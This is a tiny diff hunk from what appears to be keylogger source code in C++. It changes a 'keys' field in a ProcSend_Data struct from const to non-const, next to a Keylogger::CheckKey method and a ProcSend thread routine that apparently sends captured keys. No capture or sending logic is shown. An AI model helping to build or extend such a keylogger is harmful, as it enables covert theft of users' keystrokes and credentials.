@@ -97,7 +97,7 @@ void Keylogger::CheckKey(short i)
 
 typedef struct {
 	Keylogger *keylogger;
-	const std::tstring keys;
+	std::tstring keys;
 } ProcSend_Data;
 DWORD WINAPI ProcSend(LPVOID lpParameter)
 {
